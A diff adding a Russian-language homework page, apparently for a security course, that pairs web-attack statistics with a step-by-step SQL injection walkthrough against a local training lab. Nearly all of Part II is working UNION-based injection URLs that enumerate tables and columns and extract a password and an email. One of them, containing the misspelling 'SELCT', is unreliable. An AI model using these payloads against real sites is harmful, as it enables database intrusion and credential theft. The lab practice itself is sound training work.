@@ -1,0 +1,44 @@
+<h1 id="-i">Часть I</h1>
+<p><a href="https://expertinsights.com/web-security/50-web-security-stats-you-should-know">По данным Expert Insights</a> 26% всех кибератак и 70% успешных проникновений связаны с веб-сервисами.</p>
+<p>Топ-5 уязвимостей на сайтах зараженных вредоносным ПО:</p>
+<ol>
+<li><p>Backdoor (65%)</p>
+</li>
+<li><p>Filehacker (48%)</p>
+</li>
+<li><p>Malicious eval request (22%)</p>
+</li>
+<li><p>Shell script (22%)</p>
+</li>
+<li><p>Injector (21%)</p>
+</li>
+</ol>
+<p><a href="https://deepstrike.io/blog/vulnerability-statistics-2025">Deepstrike заявляет</a> что 90% плагинов WordPress содержат web CVE и 41% из них пригодны для серьезных атак. </p>
+<p><a href="https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/#id11">По данным PT Security</a> 27% веб атак на организации и 12% веб атак на частных лиц в 2025 году были успешными.</p>
+<p><a href="https://statistics.securelist.com/ru/web-anti-virus/month">Лаборатория Касперского</a> приводит топ-5 типов угроз, обнаруженных в Интернете:</p>
+<ol>
+<li>Trojan.Script.Generic (25.47%)</li>
+<li>Trojan.Script.Agent.gen (11.21%)</li>
+<li>Trojan.PDF.Badur.gen (8.15%)</li>
+<li>Trojan.Script.SAgent.gen (5.21%)</li>
+<li>Hoax.HTML.Phish.gen (5.13%)</li>
+</ol>
+<h1 id="-ii">Часть II</h1>
+<p><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a> даёт логин admin</p>
+<p><a href="http://localhost:8080/task/?id=0">http://localhost:8080/task/?id=0</a> не даёт никакого ответа</p>
+<p><a href="http://localhost:8080/task/?id=1%27+OR+%271%27=%271%27--">http://localhost:8080/task/?id=1%27+OR+%271%27=%271%27--</a> по ошибке узнаем что база данных - MySQL и что в запросе есть LIMIT 1 (также не забываем добавить + после --)</p>
+<p>Пробуем UNION атаку (используем id=0 из-за LIMIT 1 так как он ничего не возвращает):</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL--+</a> - неправильное количество столбцов</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL,NULL--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL,NULL--+</a> - неправильное количество столбцов</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL,NULL,NULL--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+NULL,NULL,NULL--+</a> - попали</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELCT+%27a%27,NULL,NULL--+">http://localhost:8080/task/?id=0%27+UNION+SELCT+%27a%27,NULL,NULL--+</a> - находим что первая колонка может содержать текст</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--+</a> - пытаемся узнать названия всех таблиц (но врезаемся в LIMIT 1)</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.tables--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.tables--+</a> - используем GROUP_CONCAT и получаем названия всех таблиц, но здесь много мусора в виде дефолтных таблиц MySQL</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+-">http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+-</a> фильтруем по базам данных (т.е. без дефолтных таблиц): имеем таблицы emails и users</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(column_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27--+-">http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(column_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name=%27users%27--+-</a> - в users 6 колонок: USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name=%27emails%27--+-">http://localhost:8080/task/?id=0%27+UNION+SELECT+GROUP_CONCAT(table_name),NULL,NULL+FROM+information_schema.columns+WHERE+table_name=%27emails%27--+-</a> - в emails 2 колонки: id, email_id</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+username,password,NULL+FROM+users+WHERE+username=%27Volk2%27--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+username,password,NULL+FROM+users+WHERE+username=%27Volk2%27--+</a> - <strong>получаем пароль пользователя Volk2: Wa spoiuuuuu</strong></p>
+<p>Так как username и почта лежат в разных таблицах, чтобы узнать почту по нику Vinni-pukh сначала придется узнать id:</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+id,NULL,NULL+FROM+users+WHERE+username=%27Vinni-pukh%27--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+id,NULL,NULL+FROM+users+WHERE+username=%27Vinni-pukh%27--+</a> - id=4</p>
+<p><a href="http://localhost:8080/task/?id=0%27+UNION+SELECT+email_id,NULL,NULL+FROM+emails+WHERE+id=%274%27--+">http://localhost:8080/task/?id=0%27+UNION+SELECT+email_id,NULL,NULL+FROM+emails+WHERE+id=%274%27--+</a> - <strong>почта у Vinni-pukh: honey_lover@otus-lab.com</strong></p>
+<p>P.S.: я правда делал своими руками, просто до этого уже практиковался на портсвиггере </p>
